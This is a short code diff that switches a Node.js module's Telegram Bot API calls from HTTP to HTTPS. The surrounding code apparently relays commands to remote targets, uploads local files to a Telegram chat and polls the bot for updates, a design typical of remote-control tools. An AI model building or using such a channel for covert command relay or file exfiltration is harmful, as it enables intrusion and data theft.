@@ -1,5 +1,5 @@
 const net = require('net');
-const http = require('http');
+const https = require('https');
 const cfg = require('./config');
 const registry = require('./registry');
 const agent = require('./agent');
@@ -83,7 +83,7 @@ function sendCommand(targetId, cmd, args) {
 
 function sendTelegram(text) {
   const data = JSON.stringify({ chat_id: cfg.TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' });
-  const req = http.request({
+  const req = https.request({
     hostname: 'api.telegram.org',
     path: `/bot${cfg.TELEGRAM_TOKEN}/sendMessage`,
     method: 'POST',
@@ -104,7 +104,7 @@ function sendFileToTelegram(filePath) {
   bufs.push(Buffer.from('\r\n--' + Boundary + '--\r\n'));
 
   const body = Buffer.concat(bufs);
-  const req = http.request({
+  const req = https.request({
     hostname: 'api.telegram.org',
     path: `/bot${cfg.TELEGRAM_TOKEN}/sendDocument?chat_id=${cfg.TELEGRAM_CHAT_ID}`,
     method: 'POST',
@@ -120,7 +120,7 @@ function sendFileToTelegram(filePath) {
 function startTelegramPoller() {
   let offset = 0;
   const poll = () => {
-    const req = http.get(`http://api.telegram.org/bot${cfg.TELEGRAM_TOKEN}/getUpdates?offset=${offset}&timeout=30`, (res) => {
+    const req = https.get(`https://api.telegram.org/bot${cfg.TELEGRAM_TOKEN}/getUpdates?offset=${offset}&timeout=30`, (res) => {
       let body = '';
       res.on('data', c => body += c);
       res.on('end', () => {
